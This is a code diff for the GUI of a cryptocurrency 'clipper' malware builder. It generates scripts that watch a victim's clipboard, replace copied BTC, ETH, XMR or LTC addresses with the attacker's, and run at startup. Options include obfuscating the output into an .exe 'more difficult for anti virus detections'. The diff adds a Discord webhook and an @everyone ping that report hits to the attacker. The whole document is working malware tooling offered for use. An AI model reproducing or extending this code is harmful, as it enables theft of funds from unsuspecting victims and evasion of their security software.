@@ -9,6 +9,8 @@ import customtkinter
 import subprocess
 import webbrowser
 import CTkToolTip
+import threading
+import requests
 import shutil
 import time
 import hPyT
@@ -41,6 +43,15 @@ class virustotal:
         for link in vtlinksobf:
             webbrowser.open_new_tab(link)
 
+class attempt_fix_icons:
+    def command():
+        os.system("taskkill /f /im explorer.exe")
+        os.startfile("explorer.exe")
+
+    def thread():
+        thread = threading.Thread(target=attempt_fix_icons.command())
+        thread.start()
+
 class toplevel:
     def agree():
         if agree_var.get() == "off":
@@ -54,19 +65,20 @@ class toplevel:
         hPyT.opacity.set(root, 0.999)
         hPyT.minimize_button.enable(root)
         top_level.destroy()
-        root.attributes('-topmost', True)
         root.unbind("<Configure>")
         val = dont_show_again_checkbox.get()
+        root.attributes('-topmost', False)
         if val == "on":
             with open("dont_show_again.txt", "w") as file:
                 file.close()
 
     def top():
         global top_level, dont_show_again_checkbox, agree_var, close_btn
-        
+
         top_level = customtkinter.CTkToplevel()
         top_level.geometry("600x335")
         top_level.resizable(height=False, width=False)
+        root.attributes('-topmost', True)
         top_level.attributes('-topmost', True)
         hPyT.title_bar.hide(top_level)
         hPyT.minimize_button.disable(root)
@@ -101,7 +113,7 @@ class toplevel:
         exit.pack()
 
 class resetconfig:
-    def reset(btc_addr, eth_addr, xmr_addr, ltc_addr):
+    def reset(btc_addr, eth_addr, xmr_addr, ltc_addr, webhook_url):
         global icon_path
 
         icon_path = ""
@@ -109,9 +121,9 @@ class resetconfig:
         add_icon_btn.configure(text="add custom icon", command=lambda: buildgui.icon_add())
         icon_temp_label.configure(image="", text="icon will appear here")
         
-        set_config_btn.configure(text="set config", fg_color="green", hover_color="#063b00", state="normal", command=lambda: buildclipperconfig.set_config(clipper_type, single_use_checkbox, obfuscate_checkbox, exe_file_checkbox, btc_addr, eth_addr, xmr_addr, ltc_addr))
+        set_config_btn.configure(text="set config", fg_color="green", hover_color="#063b00", state="normal", command=lambda: buildclipperconfig.set_config(clipper_type, single_use_checkbox, obfuscate_checkbox, exe_file_checkbox, btc_addr, eth_addr, xmr_addr, ltc_addr, webhook_url))
         config_set_lbl.configure(text="config not set", text_color="red")
-        check_valid_btn.configure(text="check validity of addresses", command=lambda: buildgui.check_addr_valid(btc_addr, eth_addr, xmr_addr, ltc_addr), state="normal")
+        check_valid_btn.configure(text="check validity of addresses", command=lambda: buildgui.check_addr_valid(btc_addr, eth_addr, xmr_addr, ltc_addr, webhook_url), state="normal")
         exe_file_checkbox.deselect()
         obfuscate_checkbox.deselect()
         single_use_checkbox.deselect()
@@ -165,6 +177,10 @@ class build:
             single_use = True
         else:
             single_use = False
+        if ping_discord_checkbox.get() == "on":
+            ping = True
+        else:
+            ping = False
         
         btc_addr = btc_addr1
         eth_addr = eth_addr1
@@ -195,6 +211,8 @@ class build:
         script_content = script_content.replace('ltcaddr = "SET LTC ADDRESS HERE"', f"ltcaddr = '{ltc_addr}'")
         script_content = script_content.replace('xmraddr = "SET XMR ADDRESS HERE"', f"xmraddr = '{xmr_addr}'")
         script_content = script_content.replace('single_use = False', f'single_use = {single_use}')
+        script_content = script_content.replace('webhook_url = ""', f'webhook_url = "{webhook_url1}"')
+        script_content = script_content.replace('ping = False', f'ping = {ping}')
 
         if out_name.get().strip() == "":
             new_file_name = "subprocess_clipper.pyw"
@@ -208,7 +226,7 @@ class build:
             else:
                 new_file_name = out_name.get().strip()
                 with open(os.path.join("output", new_file_name), "w") as new_file:
-                    new_file.write(script_content)       
+                    new_file.write(script_content)
         
         if obfuscate == "on":
             current_path = os.path.join("output", new_file_name)
@@ -224,6 +242,10 @@ class build:
             single_use = True
         else:
             single_use = False
+        if ping_discord_checkbox.get() == "on":
+            ping = True
+        else:
+            ping = False
         
         btc_addr = btc_addr1
         eth_addr = eth_addr1
@@ -254,6 +276,8 @@ class build:
         script_content = script_content.replace('ltcaddr = "SET LTC ADDRESS HERE"', f"ltcaddr = '{ltc_addr}'")
         script_content = script_content.replace('xmraddr = "SET XMR ADDRESS HERE"', f"xmraddr = '{xmr_addr}'")
         script_content = script_content.replace('single_use = False', f'single_use = {single_use}')
+        script_content = script_content.replace('webhook_url = ""', f'webhook_url = "{webhook_url1}"')
+        script_content = script_content.replace('ping = False', f'ping = {ping}')
 
         if out_name.get().strip() == "":
             new_file_name = "ctypes_clipper.pyw"
@@ -279,10 +303,14 @@ class build:
         os.remove("scripts/temp.pyw")
 
     def build_pyperclip(single_use, obfuscate, exe_file):
-        if single_use == "on":
+        if single_use_checkbox.get() == "on":
             single_use = True
         else:
             single_use = False
+        if ping_discord_checkbox.get() == "on":
+            ping = True
+        else:
+            ping = False
         
         btc_addr = btc_addr1
         eth_addr = eth_addr1
@@ -313,6 +341,8 @@ class build:
         script_content = script_content.replace('ltcaddr = "SET LTC ADDRESS HERE"', f"ltcaddr = '{ltc_addr}'")
         script_content = script_content.replace('xmraddr = "SET XMR ADDRESS HERE"', f"xmraddr = '{xmr_addr}'")
         script_content = script_content.replace('single_use = False', f'single_use = {single_use}')
+        script_content = script_content.replace('webhook_url = ""', f'webhook_url = "{webhook_url1}"')
+        script_content = script_content.replace('ping = False', f'ping = {ping}')
 
         if out_name.get().strip() == "":
             new_file_name = "pyperclip_clipper.pyw"
@@ -351,14 +381,15 @@ class build:
 class buildclipperconfig:
     class_called = 0
 
-    def set_config(clipper_type, single_use_checkbox, obfuscate_checkbox, exe_file_checkbox, btc_addr, eth_addr, xmr_addr, ltc_addr):
-        global type, single_use, obfuscate, exe_file
+    def set_config(clipper_type, single_use_checkbox, obfuscate_checkbox, exe_file_checkbox, btc_addr, eth_addr, xmr_addr, ltc_addr, webhook_url):
+        global type, single_use, obfuscate, exe_file, ping
 
         type = str(clipper_type.get())
 
         single_use = single_use_checkbox.get()
         obfuscate = obfuscate_checkbox.get()
         exe_file = exe_file_checkbox.get()
+        ping = ping_discord_checkbox.get()
 
         if obfuscate == "on" and exe_file == "on":
             CTkMessagebox(title="error", message="both normal .exe and obfuscate .exe cannot be on", icon="cancel")
@@ -371,41 +402,57 @@ class buildclipperconfig:
             else:
                 buildclipperconfig.class_called += 1
                 config_set_lbl.configure(text="config set", text_color="green")
-                set_config_btn.configure(text="reset config", fg_color="red", hover_color="#8B0000", command=lambda: resetconfig.reset(btc_addr, eth_addr, xmr_addr, ltc_addr))
+                set_config_btn.configure(text="reset config", fg_color="red", hover_color="#8B0000", command=lambda: resetconfig.reset(btc_addr, eth_addr, xmr_addr, ltc_addr, webhook_url))
 
 class buildgui:
-    def check_addr_valid(btc_addr, eth_addr, xmr_addr, ltc_addr):
+    def check_addr_valid(btc_addr, eth_addr, xmr_addr, ltc_addr, webhook_url):
         if buildclipperconfig.class_called == 0:
             CTkMessagebox(title="error", message="please set a config", icon="cancel")
 
         else:
-            global btc_addr1, eth_addr1, xmr_addr1, ltc_addr1
+            global btc_addr1, eth_addr1, xmr_addr1, ltc_addr1, webhook_url1
 
             btc_addr1 = str(btc_addr.get()).strip()
             eth_addr1 = str(eth_addr.get()).strip()
             xmr_addr1 = str(xmr_addr.get()).strip()
             ltc_addr1 = str(ltc_addr.get()).strip()
+            webhook_url1 = str(webhook_url.get()).strip()
 
             if btc_addr1 == "" and eth_addr1 == "" and xmr_addr1 == "" and ltc_addr1 == "":
                 CTkMessagebox(title="info", message="please add at least one crypto address")
             else:
-
                 try:
                     if btc_addr1 != "":
                         if re.match(btc_address_pattern, btc_addr1):
                             btc_addr.configure(border_color="green")
+                        else:
+                            btc_addr.configure(border_color="red")
+
 
                     if eth_addr1 != "":
                         if re.match(eth_address_pattern, eth_addr1):
                             eth_addr.configure(border_color="green")
+                        else:
+                            eth_addr.configure(border_color="red")
 
                     if xmr_addr1 != "":
                         if re.match(xmr_address_pattern, xmr_addr1):
                             xmr_addr.configure(border_color="green")
+                        else:
+                            xmr_addr.configure(border_color="red")
 
                     if ltc_addr1 != "":
                         if re.match(ltc_address_pattern, ltc_addr1):
                             ltc_addr.configure(border_color="green")
+                        else:
+                            ltc_addr.configure(border_color="red")
+                    
+                    if webhook_url1 != "":
+                        r = requests.get(webhook_url1)
+                        if r.status_code == 200:
+                            webhook_url.configure(border_color="green")
+                        else:
+                            webhook_url.configure(border_color="red")
                     
                     check_valid_btn.configure(text="build", command=lambda: build.check_type())
 
@@ -427,7 +474,7 @@ class buildgui:
             icon_temp_label.configure(image=icon_img, text="")
             
     def build_widgets():
-        global check_valid_btn, config_set_lbl, set_config_btn, clipper_type, single_use_checkbox, obfuscate_checkbox, exe_file_checkbox, out_name, icon_temp_label, add_icon_btn, icon_path
+        global check_valid_btn, config_set_lbl, set_config_btn, clipper_type, single_use_checkbox, obfuscate_checkbox, exe_file_checkbox, out_name, icon_temp_label, add_icon_btn, icon_path, ping_discord_checkbox
 
         icon_path = ""
 
@@ -437,7 +484,7 @@ class buildgui:
             widget.destroy()
 
         customtkinter.CTkLabel(master=option_frame, text="clipper settings").pack(padx=65)
-        customtkinter.CTkLabel(master=main_frame, text="(if address format isnt correct border will stay same rather than turn green)").pack()
+        customtkinter.CTkLabel(master=main_frame, text="(if address or webhook format isnt correct border will stay same rather than turn green if correct)").pack()
 
         btc_addr = customtkinter.CTkEntry(master=main_frame, placeholder_text="BTC address (leave empty if none): ")
         btc_addr.pack(fill="x", padx=5, pady=5)
@@ -447,10 +494,15 @@ class buildgui:
         ltc_addr.pack(fill="x", padx=5, pady=5)
         xmr_addr = customtkinter.CTkEntry(master=main_frame, placeholder_text="XMR address (leave empty if none): ")
         xmr_addr.pack(fill="x", padx=5, pady=0)
-        out_name = customtkinter.CTkEntry(master=main_frame, placeholder_text="output file name WITH .py extention (leave empty if for defult name): ")
-        out_name.pack(fill="x", padx=5, pady=5)
-        check_valid_btn = customtkinter.CTkButton(master=main_frame, text="check validity of addresses", command=lambda: buildgui.check_addr_valid(btc_addr, eth_addr, xmr_addr, ltc_addr), state="normal")
-        check_valid_btn.pack(fill="x", padx=5, pady=0)
+        webhook_url = customtkinter.CTkEntry(master=main_frame, placeholder_text="discord webhook (leave empty if none): ")
+        webhook_url.pack(fill="x", padx=5, pady=5)
+        out_name = customtkinter.CTkEntry(master=main_frame, placeholder_text="output file name WITH .pyw extention (leave empty if for defult name): ")
+        out_name.pack(fill="x", padx=5, pady=0)
+
+        check_valid_btn = customtkinter.CTkButton(master=main_frame, text="check validity of addresses", command=lambda: buildgui.check_addr_valid(btc_addr, eth_addr, xmr_addr, ltc_addr, webhook_url), state="normal")
+        check_valid_btn.pack(fill="x", padx=5, pady=5)
+        fix_icons = customtkinter.CTkButton(master=main_frame, text="fix icons if not showing on .exe", command=lambda: attempt_fix_icons.thread())
+        fix_icons.pack(fill="x", padx=5, pady=0)
         exit = customtkinter.CTkButton(master=main_frame, text="EXIT", fg_color="red", hover_color="#8B0000", font=("", 13, "bold"), command=lambda: sys.exit())
         exit.pack(fill="x", padx=5, pady=5)
         
@@ -463,26 +515,33 @@ class buildgui:
         clipper_type.pack(fill="x", padx=10, pady=5)
         single_use_checkbox = customtkinter.CTkCheckBox(master=option_frame, text="single use", onvalue="on", offvalue="off")
         single_use_checkbox.pack(pady=0, anchor="w", padx=(12, 0))
+        ping_discord_checkbox = customtkinter.CTkCheckBox(master=option_frame, text="@everyone discord", onvalue="on", offvalue="off")
+        ping_discord_checkbox.pack(pady=5, anchor="w", padx=(12, 0))
         obfuscate_checkbox = customtkinter.CTkCheckBox(master=option_frame, text="obfuscated .exe", onvalue="on", offvalue="off")
-        obfuscate_checkbox.pack(pady=5, anchor="w", padx=(12, 0))
+        obfuscate_checkbox.pack(pady=0, anchor="w", padx=(12, 0))
         exe_file_checkbox = customtkinter.CTkCheckBox(master=option_frame, text="normal .exe file", onvalue="on", offvalue="off")
-        exe_file_checkbox.pack(pady=0, anchor="w", padx=(12, 0))
+        exe_file_checkbox.pack(pady=5, anchor="w", padx=(12, 0))
         add_icon_btn = customtkinter.CTkButton(master=option_frame, text="add custom icon", command=lambda: buildgui.icon_add())
-        add_icon_btn.pack(fill="x", padx=10, pady=5)
+        add_icon_btn.pack(fill="x", padx=5, pady=5)
 
         icon_temp_label = customtkinter.CTkLabel(master=option_frame, text="icon will appear here", wraplength=150)
         icon_temp_label.pack(pady=(0, 5))
 
-        set_config_btn = customtkinter.CTkButton(master=option_frame, fg_color="green", hover_color="#063b00", text="set config", command=lambda: buildclipperconfig.set_config(clipper_type, single_use_checkbox, obfuscate_checkbox, exe_file_checkbox, btc_addr, eth_addr, xmr_addr, ltc_addr))
+        set_config_btn = customtkinter.CTkButton(master=option_frame, fg_color="green", hover_color="#063b00", text="set config", command=lambda: buildclipperconfig.set_config(clipper_type, single_use_checkbox, obfuscate_checkbox, exe_file_checkbox, btc_addr, eth_addr, xmr_addr, ltc_addr, webhook_url))
         set_config_btn.pack(fill="x", padx=10, pady=0)
         config_set_lbl = customtkinter.CTkLabel(master=option_frame, text="config not set", text_color="red")
         config_set_lbl.pack()
 
-        CTkToolTip.CTkToolTip(widget=single_use_checkbox, message="single use: code will run at startup until it detects a address to replace, when this happens the code will never run again - essentially only ever clipping once", delay=0.5, wraplength=300)
-        CTkToolTip.CTkToolTip(widget=obfuscate_checkbox, message="obfuscate: will run obfucscation and make .exe to make it more difficult to read and more difficult for anti virus detections", delay=0.5, wraplength=300)
-        CTkToolTip.CTkToolTip(widget=exe_file_checkbox, message=".exe file: will turn the python code into a .exe file without obfuscating", delay=0.5, wraplength=300)
-        CTkToolTip.CTkToolTip(widget=clipper_type, message="set clipper type: all methods read and regex the clipboard for crypto addresses, then replace the address with your chosen one. the subprocess method uses Pythons subprocess, which is stealthy but may be slightly slower on some laptops. the ctypes method, also stealthy and included with Python, is fast. the pyperclip method, requiring an external installation (pip install), is fast but less stealthy. subprocess and ctypes are equally effective, while pyperclip is least recommended", delay=0.5, wraplength=300)
-    
+        CTkToolTip.CTkToolTip(widget=single_use_checkbox, message="single use: code will run at startup until it detects a address to replace, when this happens the code will never run again - essentially only ever clipping once", wraplength=300)
+        CTkToolTip.CTkToolTip(widget=obfuscate_checkbox, message="obfuscate: will run obfucscation and make .exe to make it more difficult to read and more difficult for anti virus detections", wraplength=300)
+        CTkToolTip.CTkToolTip(widget=exe_file_checkbox, message=".exe file: will turn the python code into a .exe file without obfuscating", wraplength=300)
+        CTkToolTip.CTkToolTip(widget=clipper_type, message="set clipper type: all methods read and regex the clipboard for crypto addresses, then replace the address with your chosen one. the subprocess method uses Pythons subprocess, which is stealthy but may be slightly slower on some laptops. the ctypes method, also stealthy and included with Python, is fast. the pyperclip method, requiring an external installation (pip install), is fast but less stealthy. subprocess and ctypes are equally effective, while pyperclip is least recommended", wraplength=300)
+        CTkToolTip.CTkToolTip(widget=fix_icons, message="update icons: pressing this restarts explorer.exe making all icons update, this will close all folders open", wraplength=300)
+        CTkToolTip.CTkToolTip(widget=ping_discord_checkbox, message="ping discord: if enabled and discord webhook added an @everyone ping will be sent to the webhook", wraplength=300)
+        CTkToolTip.CTkToolTip(widget=set_config_btn, message="set config: sets the configuration you chose", wraplength=300)
+        CTkToolTip.CTkToolTip(widget=add_icon_btn, message="add icon: sets a custom icon to the .exe - defult is the normal .exe icon. if icons not showing press the fix icons button", wraplength=300)
+        CTkToolTip.CTkToolTip(widget=exit, message="exit: exits program", wraplength=300)
+        CTkToolTip.CTkToolTip(widget=check_valid_btn, message="check valid: checks validity of crypto addresses and discord webhook", wraplength=300)
     def main():
         global option_frame, main_frame, root
 
@@ -492,7 +551,6 @@ class buildgui:
         root.geometry("600x400")
         root.resizable(height=False, width=False)
         root.iconbitmap("DefultIcons/racoon.ico")
-        root.attributes('-topmost', True)
 
         hPyT.rainbow_border.start(window=root, interval=5)
 
@@ -558,7 +616,6 @@ Honestly im not sure why this happens - for some reason the icons bind to the ex
             toplevel.top()
 
         root.mainloop()
-
 if __name__ == "__main__":
     if os.name == "nt":
         if os.path.exists("output\\dist_obfuscated"):
